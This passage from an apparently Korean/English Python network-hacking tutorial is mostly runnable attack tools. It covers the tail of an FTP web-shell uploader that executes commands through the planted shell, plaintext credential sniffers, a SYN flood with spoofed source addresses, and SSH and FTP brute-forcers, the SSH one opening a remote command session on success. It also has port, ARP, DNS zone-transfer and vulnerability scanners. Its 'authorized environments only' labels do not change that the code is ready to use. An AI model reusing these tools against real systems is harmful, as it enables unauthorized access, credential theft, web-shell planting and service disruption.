        print(f"[-] 웹셸 응답 없음 (HTTP {r.status_code})")
    except requests.RequestException as exc:
        print(f"[!] 요청 실패: {exc}", file=sys.stderr)
    return None


def main() -> None:
    parser = argparse.ArgumentParser(description="FTP 웹셸 업로드 도구 (허가된 환경 전용)")
    parser.add_argument("host", help="FTP 서버 주소")
    parser.add_argument("user", help="FTP 사용자명")
    parser.add_argument("password", help="FTP 패스워드")
    parser.add_argument("remote_dir", help="업로드 경로 (예: APM_Setup/htdocs)")
    parser.add_argument("--port", type=int, default=21)
    parser.add_argument("--web-url", help="웹 접근 URL (검증용, 예: http://target.com)")
    parser.add_argument("--shell-name", default=SHELL_NAME)
    args = parser.parse_args()

    ok = upload_webshell(args.host, args.port, args.user, args.password,
                         args.remote_dir, args.shell_name)
    if ok and args.web_url:
        verify_and_exec(args.web_url, args.shell_name)


if __name__ == "__main__":
    main()
```

### 예제7-5 Packet Sniffing — scapy 기반 자격증명 탐지기 (Python 3.10+)
```python
#!/usr/bin/env python3
"""
평문 프로토콜 자격증명 스니퍼 (Python 3.10+)
용도: HTTP/FTP/Telnet 평문 자격증명 실시간 탐지
의존성: pip install scapy
사용법: sudo python3 cred_sniffer.py -i eth0
"""
from __future__ import annotations
import argparse
import re
import sys

try:
    from scapy.all import IP, Raw, TCP, sniff
except ImportError:
    print("[!] 의존성 누락: pip install scapy", file=sys.stderr)
    sys.exit(1)


# 탐지 패턴 (프로토콜, 패턴, 설명)
PATTERNS: list[tuple[str, re.Pattern, str]] = [
    ("FTP",    re.compile(rb"(?i)^(USER|PASS) (.+)\r\n"),         "FTP 자격증명"),
    ("HTTP",   re.compile(rb"(?i)(username|password|passwd|pwd|login)=[^&\s]+"), "HTTP 폼 데이터"),
    ("Telnet", re.compile(rb"[A-Za-z0-9!@#$%]{3,}"),              "Telnet 입력"),
    ("SMTP",   re.compile(rb"(?i)^AUTH .+\r\n"),                   "SMTP 인증"),
]

CRED_PORTS = {21, 23, 25, 80, 110, 143, 8080}


def packet_handler(pkt) -> None:
    if not (pkt.haslayer(IP) and pkt.haslayer(TCP) and pkt.haslayer(Raw)):
        return

    src_ip: str = pkt[IP].src
    dst_ip: str = pkt[IP].dst
    dport: int = pkt[TCP].dport
    sport: int = pkt[TCP].sport
    payload: bytes = bytes(pkt[Raw].load)

    if not payload:
        return

    direction = f"{src_ip}:{sport} → {dst_ip}:{dport}"

    for proto, pattern, desc in PATTERNS:
        # 포트 필터 (Telnet은 23번, HTTP는 80/8080)
        relevant_port = (
            (proto == "FTP" and dport == 21) or
            (proto == "Telnet" and dport == 23) or
            (proto == "HTTP" and dport in {80, 8080}) or
            (proto == "SMTP" and dport in {25, 587}) or
            dport in CRED_PORTS
        )
        if not relevant_port:
            continue

        m = pattern.search(payload)
        if m:
            found = m.group(0).decode("utf-8", errors="replace").strip()
            print(f"\n[!] {desc} 탐지")
            print(f"    방향: {direction}")
            print(f"    데이터: {found[:120]}")
            print(f"    원시: {payload[:200]}")
            break


def main() -> None:
    parser = argparse.ArgumentParser(description="평문 프로토콜 자격증명 스니퍼 (root 권한 필요)")
    parser.add_argument("-i", "--interface", default="eth0", help="네트워크 인터페이스 (기본값: eth0)")
    parser.add_argument("-c", "--count", type=int, default=0, help="캡처할 패킷 수 (0=무제한)")
    parser.add_argument("-f", "--filter", default="tcp", help="BPF 필터 (기본값: tcp)")
    args = parser.parse_args()

    print(f"[*] 스니핑 시작 — 인터페이스: {args.interface}  필터: {args.filter}")
    print("[*] Ctrl+C로 중지\n")
    try:
        sniff(
            iface=args.interface,
            filter=args.filter,
            prn=packet_handler,
            count=args.count,
            store=False,
        )
    except KeyboardInterrupt:
        print("\n[*] 스니핑 종료")


if __name__ == "__main__":
    main()
```

### 예제7-6 / 7-7 TCP SYN Flood — Raw 소켓 SYN 패킷 생성 (Python 3.10+, 교육 목적)
```python
#!/usr/bin/env python3
"""
TCP SYN Flood 데모 — 교육·방어 이해 목적 (Python 3.10+)
실제 공격에 사용 금지. 허가된 격리 환경에서만 테스트.
사용법: sudo python3 syn_flood_demo.py <target_ip> <target_port> [--count 10]
"""
from __future__ import annotations
import argparse
import random
import socket
import struct
import sys


def _checksum(data: bytes) -> int:
    """인터넷 체크섬 계산."""
    s = 0
    n = len(data)
    for i in range(0, n - 1, 2):
        s += (data[i] << 8) + data[i + 1]
    if n % 2:
        s += data[-1] << 8
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return ~s & 0xFFFF


def _build_ip_header(src_ip: str, dst_ip: str) -> bytes:
    src = socket.inet_aton(src_ip)
    dst = socket.inet_aton(dst_ip)
    hdr = struct.pack(
        "!BBHHHBBH4s4s",
        0x45, 0,       # version/IHL, TOS
        40,            # total length (IP + TCP)
        random.randint(0, 0xFFFF),  # ID
        0,             # flags + offset
        64,            # TTL
        socket.IPPROTO_TCP,
        0,             # checksum (kernel fills)
        src, dst,
    )
    return hdr


def _build_tcp_syn(src_port: int, dst_port: int, src_ip: str, dst_ip: str) -> bytes:
    seq = random.randint(0, 0xFFFFFFFF)
    tcp_hdr = struct.pack(
        "!HHLLBBHHH",
        src_port, dst_port,
        seq, 0,
        0x50,   # data offset = 5 words
        0x02,   # SYN flag
        socket.htons(65535),
        0,      # checksum placeholder
        0,
    )
    # Pseudo header for checksum
    pseudo = struct.pack(
        "!4s4sBBH",
        socket.inet_aton(src_ip),
        socket.inet_aton(dst_ip),
        0,
        socket.IPPROTO_TCP,
        len(tcp_hdr),
    )
    chk = _checksum(pseudo + tcp_hdr)
    return struct.pack(
        "!HHLLBBHHH",
        src_port, dst_port,
        seq, 0,
        0x50, 0x02,
        socket.htons(65535),
        chk,
        0,
    )


def syn_flood(dst_ip: str, dst_port: int, count: int = 10) -> None:
    """SYN Flood 시연 (허가된 격리 환경에서만 사용)."""
    raw = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    raw.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    print(f"[*] SYN Flood 데모: {dst_ip}:{dst_port} × {count}패킷")

    for i in range(count):
        src_ip = f"{random.randint(1,254)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
        src_port = random.randint(1024, 65535)
        ip_hdr = _build_ip_header(src_ip, dst_ip)
        tcp_hdr = _build_tcp_syn(src_port, dst_port, src_ip, dst_ip)
        raw.sendto(ip_hdr + tcp_hdr, (dst_ip, 0))
        print(f"  [{i+1:>4}] {src_ip}:{src_port} → {dst_ip}:{dst_port}")

    raw.close()
    print("[*] 완료")


def main() -> None:
    parser = argparse.ArgumentParser(
        description="TCP SYN Flood 데모 (교육 목적, 허가된 환경 전용)"
    )
    parser.add_argument("target_ip", help="대상 IP 주소")
    parser.add_argument("target_port", type=int, help="대상 포트")
    parser.add_argument("--count", type=int, default=10, help="전송할 SYN 패킷 수 (기본값: 10)")
    args = parser.parse_args()

    if args.count > 1000:
        print("[!] 안전을 위해 최대 1000패킷으로 제한합니다.", file=sys.stderr)
        args.count = 1000

    syn_flood(args.target_ip, args.target_port, args.count)


if __name__ == "__main__":
    main()
```

## 10. 도구 실행 참고

```
⚠️  모든 도구는 허가된 환경에서만 사용!
    - CTF 챌린지
    - 자신이 소유한 시스템
    - 계약된 침투 테스트 대상

필요 패키지 설치:
pip install scapy paramiko requests dnspython python-whois

Scapy 사용 시 root/관리자 권한 필요:
sudo python3 scanner.py 192.168.1.0/24
```

---

<a name="english"></a>

# Python Network Scanning Tool Development

## 1. Socket Programming Basics

Use Python's socket module to implement TCP/UDP network communication. This covers the fundamental structure of creating client/server sockets, connecting, and sending/receiving data.

```python
import socket
import threading
from datetime import datetime

# Basic socket connection test
def check_port(host, port, timeout=1):
    """Check a single port connection"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    result = sock.connect_ex((host, port))
    sock.close()
    return result == 0  # 0 = success (port is open)

# Usage example
if check_port("192.168.1.1", 80):
    print("[+] Port 80 is OPEN")
```

---

## 2. Multi-threaded Port Scanner

Implement parallel port scanning using the threading module. A thread pool scans multiple ports simultaneously, dramatically increasing speed.

```python
import socket
import threading
import queue
from datetime import datetime

class PortScanner:
    def __init__(self, target, start_port=1, end_port=1024, threads=100, timeout=1):
        self.target = target
        self.start_port = start_port
        self.end_port = end_port
        self.threads = threads
        self.timeout = timeout
        self.open_ports = []
        self.port_queue = queue.Queue()
        self.lock = threading.Lock()

    def scan_port(self):
        """Pop a port from the work queue and scan it"""
        while True:
            try:
                port = self.port_queue.get_nowait()
            except queue.Empty:
                break

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            result = sock.connect_ex((self.target, port))
            sock.close()

            if result == 0:
                try:
                    # Look up service name
                    service = socket.getservbyport(port)
                except:
                    service = "unknown"
                
                with self.lock:
                    self.open_ports.append((port, service))
                    print(f"[+] Port {port:5d} OPEN  ({service})")
            
            self.port_queue.task_done()

    def run(self):
        """Execute the port scan"""
        print(f"\n[*] Scan start: {self.target}")
        print(f"[*] Range: {self.start_port} - {self.end_port}")
        print(f"[*] Start time: {datetime.now().strftime('%H:%M:%S')}")
        print("-" * 50)

        # Fill the port queue
        for port in range(self.start_port, self.end_port + 1):
            self.port_queue.put(port)

        # Start threads
        thread_list = []
        for _ in range(min(self.threads, self.end_port - self.start_port + 1)):
            t = threading.Thread(target=self.scan_port)
            t.daemon = True
            thread_list.append(t)
            t.start()

        # Wait for completion
        for t in thread_list:
            t.join()

        print("-" * 50)
        print(f"[*] End time: {datetime.now().strftime('%H:%M:%S')}")
        print(f"[*] Open ports: {len(self.open_ports)}")
        
        return sorted(self.open_ports)


# Banner grabber (service version collection)
def grab_banner(host, port, timeout=3):
    """Collect service banner"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))
        
        # Send request for HTTP
        if port in [80, 8080, 8000]:
            sock.send(b"HEAD / HTTP/1.0\r\nHost: " + host.encode() + b"\r\n\r\n")
        elif port == 443:
            sock.send(b"HEAD / HTTP/1.0\r\n\r\n")
        
        banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
        sock.close()
        return banner[:200]  # First 200 characters
    except:
        return None


if __name__ == "__main__":
    import sys
    
    if len(sys.argv) < 2:
        print(f"Usage: python {sys.argv[0]} <target_ip> [start_port] [end_port]")
        sys.exit(1)
    
    target = sys.argv[1]
    start = int(sys.argv[2]) if len(sys.argv) > 2 else 1
    end = int(sys.argv[3]) if len(sys.argv) > 3 else 1024
    
    scanner = PortScanner(target, start, end)
    open_ports = scanner.run()
    
    # Collect banners
    print("\n[*] Collecting banners...")
    for port, service in open_ports:
        banner = grab_banner(target, port)
        if banner:
            print(f"    Port {port} ({service}): {banner[:80]}")
```

---

## 3. Network Host Discovery (ARP Scan)

Scapy is a powerful Python library for directly creating, sending, receiving, and analyzing network packets. It is used to implement low-level network attacks such as ARP spoofing, port scanning, and packet injection in Python code.

```python
from scapy.all import ARP, Ether, srp
import ipaddress

def arp_scan(network):
    """Network host discovery using ARP"""
    print(f"[*] ARP scan: {network}")
    
    # Create ARP request packet
    arp = ARP(pdst=network)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp
    
    # Send packets and collect responses
    result = srp(packet, timeout=3, verbose=False)[0]
    
    hosts = []
    for sent, received in result:
        hosts.append({
            'ip': received.psrc,
            'mac': received.hwsrc
        })
        print(f"[+] {received.psrc:15s}  {received.hwsrc}")
    
    print(f"\n[*] Total hosts found: {len(hosts)}")
    return hosts


# ICMP Ping scan (when ARP is unavailable)
def ping_scan(network):
    """Host discovery using ICMP"""
    from scapy.all import IP, ICMP, sr1
    
    live_hosts = []
    net = ipaddress.ip_network(network, strict=False)
    
    for ip in net.hosts():
        ip_str = str(ip)
        packet = IP(dst=ip_str) / ICMP()
        reply = sr1(packet, timeout=1, verbose=False)
        
        if reply is not None:
            print(f"[+] {ip_str} is ALIVE")
            live_hosts.append(ip_str)
    
    return live_hosts


if __name__ == "__main__":
    arp_scan("192.168.1.0/24")
```

---

## 4. Packet Sniffer

Scapy is a powerful Python library for directly creating, sending, receiving, and analyzing network packets. It is used to implement low-level network attacks such as ARP spoofing, port scanning, and packet injection in Python code.

```python
from scapy.all import sniff, IP, TCP, UDP, DNS, Raw
import datetime

def packet_callback(packet):
    """Packet analysis callback"""
    timestamp = datetime.datetime.now().strftime("%H:%M:%S.%f")[:-3]
    
    if packet.haslayer(IP):
        src_ip = packet[IP].src
        dst_ip = packet[IP].dst
        
        # TCP
        if packet.haslayer(TCP):
            sport = packet[TCP].sport
            dport = packet[TCP].dport
            flags = packet[TCP].flags
            
            # Detect HTTP requests
            if dport == 80 and packet.haslayer(Raw):
                payload = packet[Raw].load.decode('utf-8', errors='ignore')
                if payload.startswith(('GET ', 'POST ', 'PUT ', 'DELETE ')):
                    lines = payload.split('\r\n')
                    print(f"[HTTP] {src_ip} → {dst_ip} | {lines[0][:80]}")
                    return
            
            # Detect FTP credentials
            if dport == 21 and packet.haslayer(Raw):
                payload = packet[Raw].load.decode('utf-8', errors='ignore').strip()
                if payload.upper().startswith(('USER ', 'PASS ')):
                    print(f"[FTP!] {src_ip} → {dst_ip} | {payload}")
                    return
            
            # Detect Telnet
            if dport == 23 and packet.haslayer(Raw):
                payload = packet[Raw].load.decode('utf-8', errors='ignore')
                print(f"[TELNET!] {src_ip} | {repr(payload[:50])}")
                return
            
            # Detect SYN scan
            if flags == 'S' and dport < 1024:
                print(f"[SCAN?] {src_ip} → {dst_ip}:{dport} SYN")
                return
        
        # Print DNS queries
        if packet.haslayer(DNS) and packet[DNS].qr == 0:
            domain = packet[DNS].qd.qname.decode().rstrip('.')
            print(f"[DNS] {src_ip} queries: {domain}")
            return
    
    # Default output (IP packets)
    if packet.haslayer(IP):
        print(f"[{timestamp}] {packet[IP].src} → {packet[IP].dst} | {packet[IP].proto}")


def start_sniffer(interface="eth0", count=0, filter_str=""):
    """Start the packet sniffer"""
    print(f"[*] Sniffing started: {interface}")
    print("[*] Press Ctrl+C to stop")
    print("-" * 60)
    
    sniff(
        iface=interface,
        prn=packet_callback,
        count=count,
        filter=filter_str,
        store=False
    )


# Credential-focused sniffer
def credential_sniffer(interface="eth0"):
    """Dedicated plaintext credential detection"""
    print("[*] Credential sniffer (HTTP/FTP/Telnet)")
    
    KEYWORDS = [b'username', b'password', b'passwd', b'user=', b'pass=',
                b'login', b'credential', b'auth', b'USER ', b'PASS ']
    
    def check_credentials(packet):
        if packet.haslayer(Raw):
            payload = packet[Raw].load.lower()
            for keyword in KEYWORDS:
                if keyword.lower() in payload:
                    src = packet[IP].src if packet.haslayer(IP) else "?"
                    print(f"[!] Credential detected from {src}:")
                    print(f"    {packet[Raw].load[:200]}")
                    break
    
    sniff(iface=interface, prn=check_credentials, filter="tcp", store=False)
```

---

## 5. DNS Enumeration Tool

Enumerate DNS records using the dnspython library. Automates A, MX, NS, TXT record lookups and subdomain brute-forcing.

```python
import dns.resolver
import concurrent.futures

def dns_lookup(domain, record_type='A'):
    """DNS record lookup"""
    try:
        answers = dns.resolver.resolve(domain, record_type)
        return [str(r) for r in answers]
    except:
        return []


def subdomain_enum(domain, wordlist_file, threads=50):
    """Subdomain enumeration (DNS brute-forcing)"""
    found = []
    
    def check_subdomain(sub):
        target = f"{sub}.{domain}"
        result = dns_lookup(target, 'A')
        if result:
            print(f"[+] {target:40s} → {', '.join(result)}")
            found.append((target, result))
    
    print(f"[*] Subdomain enumeration: {domain}")
    
    with open(wordlist_file, 'r') as f:
        subdomains = [line.strip() for line in f if line.strip()]
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        executor.map(check_subdomain, subdomains)
    
    return found


def dns_zone_transfer(domain):
    """DNS zone transfer attempt (AXFR)"""
    print(f"[*] Zone transfer attempt: {domain}")
    
    # Get NS server list
    ns_records = dns_lookup(domain, 'NS')
    
    for ns in ns_records:
        ns = ns.rstrip('.')
        print(f"[*] Trying NS server: {ns}")
        try:
            zone = dns.zone.from_xfr(dns.query.xfr(ns, domain))
            print(f"[!] Zone transfer succeeded! NS: {ns}")
            for name, node in zone.nodes.items():
                print(f"    {name}.{domain}")
        except Exception as e:
            print(f"    [-] Failed: {e}")


def reverse_dns_sweep(network):
    """Reverse DNS lookup (IP → domain)"""
    import ipaddress
    
    net = ipaddress.ip_network(network, strict=False)
    
    for ip in net.hosts():
        ip_str = str(ip)
        try:
            result = dns.resolver.resolve_address(ip_str)
            hostname = str(result[0])
            print(f"[+] {ip_str:15s} → {hostname}")
        except:
            pass


# Execution example
if __name__ == "__main__":
    domain = "example.com"
    
    # Collect A, MX, NS, TXT records
    for record_type in ['A', 'MX', 'NS', 'TXT', 'CNAME', 'SOA']:
        results = dns_lookup(domain, record_type)
        if results:
            print(f"[{record_type}] {domain}:")
            for r in results:
                print(f"    {r}")
    
    # Attempt zone transfer
    dns_zone_transfer(domain)
```

---

## 6. SSH Brute-Forcer

Implement an SSH brute-force attack using the paramiko SSH library. Attempts SSH credentials using a wordlist.

```python
import paramiko
import time
from queue import Queue
import threading

class SSHBruteForcer:
    def __init__(self, target, port=22, threads=5, delay=0.5):
        self.target = target
        self.port = port
        self.threads = threads
        self.delay = delay  # Rate limiting (controls attempts per second)
        self.found = False
        self.credential_queue = Queue()
        self.lock = threading.Lock()

    def try_login(self, username, password):
        """Attempt SSH login"""
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        try:
            client.connect(
                self.target, 
                port=self.port,
                username=username, 
                password=password,
                timeout=5,
                banner_timeout=5
            )
            client.close()
            return True
        except paramiko.AuthenticationException:
            return False
        except Exception as e:
            return None  # Connection error

    def worker(self):
        """Worker thread"""
        while not self.found:
            try:
                username, password = self.credential_queue.get_nowait()
            except:
                break
            
            time.sleep(self.delay)
            result = self.try_login(username, password)
            
            if result is True:
                with self.lock:
                    if not self.found:
                        self.found = True
                        print(f"\n[!!!] Success! {username}:{password}")
                        # Open session
                        self._open_session(username, password)
            elif result is None:
                # Connection error → re-queue
                self.credential_queue.put((username, password))
            else:
                print(f"[-] Failed: {username}:{password[:3]}***")
            
            self.credential_queue.task_done()

    def _open_session(self, username, password):
        """Execute commands with successful credentials"""
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(self.target, port=self.port, 
                       username=username, password=password)
        
        print("\n[*] Starting interactive session (type 'exit' to quit)")
        while True:
            cmd = input(f"{username}@{self.target}$ ")
            if cmd.lower() == 'exit':
                break
            stdin, stdout, stderr = client.exec_command(cmd)
            print(stdout.read().decode())
            err = stderr.read().decode()
            if err:
                print(f"[STDERR] {err}")
        
        client.close()

    def run(self, usernames_file, passwords_file):
        """Run the brute-force attack"""
        print(f"[*] SSH brute-force: {self.target}:{self.port}")
        
        with open(usernames_file) as uf, open(passwords_file) as pf:
            users = [u.strip() for u in uf]
            passwords = [p.strip() for p in pf]
        
        # Build credential combination queue
        for user in users:
            for pwd in passwords:
                self.credential_queue.put((user, pwd))
        
        print(f"[*] Total attempts: {self.credential_queue.qsize()}")
        
        # Start threads
        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self.worker)
            t.daemon = True
            threads.append(t)
            t.start()
        
        for t in threads:
            t.join()
        
        if not self.found:
            print("[-] No valid credentials found")
```

---

## 7. Vulnerability Scanner (CVE-based)

A socket-based CVE vulnerability scanner. Uses banner grabbing to identify service versions and matches them against a known vulnerability database.

```python
import socket
import re
import requests

class VulnScanner:
    """Simple vulnerability scanner"""
    
    def __init__(self, target):
        self.target = target
        self.results = []

    def check_ftp_anonymous(self, port=21):
        """Check for FTP anonymous login"""
        try:
            sock = socket.socket()
            sock.settimeout(5)
            sock.connect((self.target, port))
            banner = sock.recv(1024).decode()
            
            sock.send(b"USER anonymous\r\n")
            resp = sock.recv(1024).decode()
            sock.send(b"PASS anonymous@test.com\r\n")
            resp = sock.recv(1024).decode()
            sock.close()
            
            if "230" in resp:  # 230 = login success
                print(f"[VULN] FTP anonymous login allowed! ({self.target}:{port})")
                self.results.append(("FTP Anonymous", "HIGH", port))
        except:
            pass

    def check_http_headers(self, port=80):
        """Check HTTP security headers"""
        try:
            r = requests.get(f"http://{self.target}:{port}", timeout=5, verify=False)
            headers = r.headers
            
            missing = []
            security_headers = [
                'X-XSS-Protection',
                'X-Frame-Options',
                'X-Content-Type-Options',
                'Strict-Transport-Security',
                'Content-Security-Policy'
            ]
            
            for header in security_headers:
                if header not in headers:
                    missing.append(header)
            
            if missing:
                print(f"[INFO] Missing security headers: {', '.join(missing)}")
            
            # Server version disclosure
            if 'Server' in headers:
                server = headers['Server']
                print(f"[INFO] Server version disclosed: {server}")
                
                # Vulnerable Apache version
                match = re.search(r'Apache/(\d+\.\d+\.\d+)', server)
                if match:
                    version = match.group(1)
                    print(f"[VULN?] Apache {version} — CVE check required")
        except:
            pass

    def check_smb_ms17_010(self, port=445):
        """Check for EternalBlue (MS17-010) vulnerability"""
        try:
            # NetBIOS session request
            sock = socket.socket()
            sock.settimeout(5)
            sock.connect((self.target, port))
            
            # SMB Negotiate Protocol Request
            negotiate = (
                b'\x00\x00\x00\x54'  # NetBIOS
                b'\xff\x53\x4d\x42'  # SMB Header
                b'\x72\x00\x00\x00'
                b'\x00\x18\x01\x28\x00\x00\x00\x00\x00\x00\x00\x00'
                b'\x00\x00\x00\x00\x00\x00\xff\xfe\x00\x00\x00\x00'
                b'\x00\x31\x00\x02\x4c\x41\x4e\x4d\x41\x4e\x31\x2e'
                b'\x30\x00\x02\x4c\x4d\x31\x2e\x32\x58\x30\x30\x32'
                b'\x00\x02\x4e\x54\x20\x4c\x4d\x20\x30\x2e\x31\x32'
                b'\x00\x02\x53\x4d\x42\x20\x32\x2e\x30\x30\x32\x00'
            )
            sock.send(negotiate)
            response = sock.recv(1024)
            sock.close()
            
            if b'\xff\x53\x4d\x42' in response:
                print(f"[INFO] SMB service confirmed: {self.target}:{port}")
                # Actual MS17-010 check requires more complex packet exchange
        except:
            pass

    def run(self):
        """Run the full scan"""
        print(f"[*] Vulnerability scan: {self.target}")
        self.check_ftp_anonymous()
        self.check_http_headers()
        self.check_smb_ms17_010()
        
        if self.results:
            print(f"\n[*] Vulnerabilities found: {len(self.results)}")
            for name, severity, port in self.results:
                print(f"    [{severity}] {name} (Port {port})")
        else:
            print("[-] No clear vulnerabilities found")
```

---

## 8. Practical OSINT Toolkit

An automated OSINT tool. Collects publicly available information about a target using the Shodan, Censys, and VirusTotal APIs.

```python
import requests
import json

class OSINTTools:
    """Online OSINT collection tool"""
    
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'Mozilla/5.0'})

    def check_ip_reputation(self, ip):
        """Check IP reputation (AbuseIPDB)"""
        # API key required: https://www.abuseipdb.com/
        headers = {
            'Accept': 'application/json',
            'Key': 'YOUR_API_KEY'
        }
        params = {'ipAddress': ip, 'maxAgeInDays': '90'}
        
        try:
            r = requests.get(
                'https://api.abuseipdb.com/api/v2/check',
                headers=headers, params=params, timeout=10
            )
            data = r.json()['data']
            print(f"IP: {ip}")
            print(f"  Malicious reports: {data['totalReports']}")
            print(f"  Abuse confidence score: {data['abuseConfidenceScore']}%")
            print(f"  Country: {data['countryCode']}")
            print(f"  ISP: {data['isp']}")
        except Exception as e:
            print(f"Error: {e}")

    def shodan_search(self, api_key, query):
        """Shodan search"""
        # pip install shodan
        import shodan
        api = shodan.Shodan(api_key)
        
        results = api.search(query)
        print(f"[*] Search results: {results['total']}")
        
        for result in results['matches'][:10]:
            print(f"\n[+] {result['ip_str']}:{result['port']}")
            print(f"    Organization: {result.get('org', 'N/A')}")
            print(f"    Location: {result.get('location', {}).get('country_name', 'N/A')}")
            print(f"    Banner: {result.get('data', '')[:100]}")

    def whois_lookup(self, domain):
        """Whois lookup"""
        import whois  # pip install python-whois
        w = whois.whois(domain)
        print(f"Domain: {domain}")
        print(f"Registrant: {w.registrant_name}")
        print(f"Created: {w.creation_date}")
        print(f"Expires: {w.expiration_date}")
        print(f"Name servers: {w.name_servers}")


# Execution
if __name__ == "__main__":
    # Port scanner
    scanner = PortScanner("192.168.1.1", 1, 1024)
    open_ports = scanner.run()
    
    # DNS enumeration
    dns_zone_transfer("example.com")
    
    print("\n[*] All scans complete")
```

---

---

## 9. Original Network Hacking Examples

### Example 7-1: Port Scanning — Port scan and protocol/service output using the nmap library
```python
import sys
import os
import socket
import nmap                                                        #(1)

nm = nmap.PortScanner()                                            #(2)

nm.scan('server', '1-1024')                                        #(3)

for host in nm.all_hosts():                                        #(4)
    print('----------------------------------------------------')
    print('Host : {0} ({1})'.format(host, nm[host].hostname()))    #(5)
    print('State : {0}'.format(nm[host].state()))                  #(6)

    for proto in nm[host].all_protocols():                         #(7)
        print('----------')
        print('Protocol : {0}'.format(proto))                        

        lport = list(nm[host][proto].keys())                       #(8)
        lport.sort()
        for port in lport:
            print('port : {0}\tstate : {1}'.format(port, nm[host][proto][port]))   #(9)
print('----------------------------------------------------')
```

### Example 7-2: FTP Password Cracking — Multi-threaded FTP brute-forcer (Python 3.10+)
```python
#!/usr/bin/env python3
"""
Multi-threaded FTP Brute-Forcer (Python 3.10+)
Purpose: Dictionary attack against FTP services (authorized systems only)
Usage: python3 ftp_crack.py <host> <user> <wordlist> [--threads 10]
"""
from __future__ import annotations
import argparse
import ftplib
import queue
import threading
import sys
from pathlib import Path


def try_ftp_login(host: str, port: int, username: str, password: str, timeout: int = 5) -> bool:
    """Attempt FTP login. Returns True on success."""
    try:
        ftp = ftplib.FTP()
        ftp.connect(host, port, timeout=timeout)
        ftp.login(username, password)
        ftp.quit()
        return True
    except ftplib.error_perm:
        return False
    except Exception:
        return False


def list_ftp_tree(host: str, port: int, username: str, password: str,
                  target_dir: str = "htdocs") -> list[str]:
    """Connect via FTP and recursively traverse directories, collecting paths containing target_dir."""
    found: list[str] = []
    try:
        ftp = ftplib.FTP()
        ftp.connect(host, port, timeout=10)
        ftp.login(username, password)

        def walk(path: str) -> None:
            try:
                entries = ftp.nlst(path) if path else ftp.nlst()
            except ftplib.error_perm:
                return
            for entry in entries:
                if "." not in Path(entry).name:   # Treat as directory
                    if target_dir.lower() in entry.lower():
                        found.append(entry)
                        print(f"  [!] {entry}")
                    walk(entry)

        walk("")
        ftp.quit()
    except Exception as exc:
        print(f"[!] FTP traversal error: {exc}", file=sys.stderr)
    return found


class FTPBruteForcer:
    def __init__(self, host: str, port: int, username: str,
                 wordlist: str, n_threads: int = 10) -> None:
        self.host = host
        self.port = port
        self.username = username
        self.n_threads = n_threads
        self._found_event = threading.Event()
        self._found_password: str | None = None
        self._lock = threading.Lock()
        self._queue: queue.Queue[str] = queue.Queue()

        with Path(wordlist).open(encoding="utf-8", errors="replace") as fh:
            for line in fh:
                pw = line.strip()
                if pw:
                    self._queue.put(pw)

        print(f"[*] Target: {host}:{port}  User: {username}")
        print(f"[*] Passwords to try: {self._queue.qsize()}  Threads: {n_threads}")

    def _worker(self) -> None:
        while not self._found_event.is_set():
            try:
                password = self._queue.get_nowait()
            except queue.Empty:
                return
            if try_ftp_login(self.host, self.port, self.username, password):
                with self._lock:
                    if not self._found_event.is_set():
                        self._found_password = password
                        self._found_event.set()
                        print(f"\n[+] Password found: {self.username}:{password}")
            else:
                print(f"\r[-] {password:<30}", end="", flush=True)
            self._queue.task_done()

    def run(self) -> str | None:
        threads = [
            threading.Thread(target=self._worker, daemon=True)
            for _ in range(self.n_threads)
        ]
        for t in threads:
            t.start()
        for t in threads:
            t.join()
        if not self._found_password:
            print("\n[-] Password not found.")
        return self._found_password


def main() -> None:
    parser = argparse.ArgumentParser(description="Multi-threaded FTP Brute-Forcer")
    parser.add_argument("host", help="FTP server address")
    parser.add_argument("user", help="Username")
    parser.add_argument("wordlist", help="Password list file")
    parser.add_argument("--port", type=int, default=21, help="FTP port (default: 21)")
    parser.add_argument("--threads", type=int, default=10, help="Number of threads (default: 10)")
    args = parser.parse_args()

    cracker = FTPBruteForcer(args.host, args.port, args.user, args.wordlist, args.threads)
    cracker.run()


if __name__ == "__main__":
    main()
```

### Example 7-3: Directory Listing — FTP recursive traversal and web root detection (Python 3.10+)
```python
#!/usr/bin/env python3
"""
FTP Recursive Directory Explorer (Python 3.10+)
Purpose: Locate web root directories (htdocs, www, public_html, etc.) on FTP servers
Usage: python3 ftp_tree.py <host> <user> <pass> [--target htdocs]
"""
from __future__ import annotations
import argparse
import ftplib
import sys


WEBROOT_CANDIDATES = ["htdocs", "www", "public_html", "webroot", "html", "site"]


def ftp_recursive_list(
    ftp: ftplib.FTP,
    path: str = "",
    depth: int = 0,
    max_depth: int = 5,
    target_dirs: list[str] | None = None,
) -> list[str]:
    """Recursively traverse FTP directories, returning a list of matched paths."""
    if depth > max_depth:
        return []

    targets = target_dirs or WEBROOT_CANDIDATES
    found: list[str] = []
    prefix = "  " * depth

    try:
        entries = ftp.nlst(path) if path else ftp.nlst()
    except ftplib.error_perm as e:
        if "550" in str(e):
            return []
        raise

    for entry in entries:
        name = entry.rsplit("/", 1)[-1]
        # Treat as directory if no extension (simple heuristic)
        is_dir = "." not in name

        for keyword in targets:
            if keyword.lower() in entry.lower():
                print(f"{prefix}[!] Found: {entry}")
                found.append(entry)

        print(f"{prefix}{entry}")

        if is_dir:
            found.extend(
                ftp_recursive_list(ftp, entry, depth + 1, max_depth, targets)
            )

    return found


def main() -> None:
    parser = argparse.ArgumentParser(description="FTP Recursive Directory Explorer")
    parser.add_argument("host", help="FTP server address")
    parser.add_argument("user", help="FTP username")
    parser.add_argument("password", help="FTP password")
    parser.add_argument("--port", type=int, default=21)
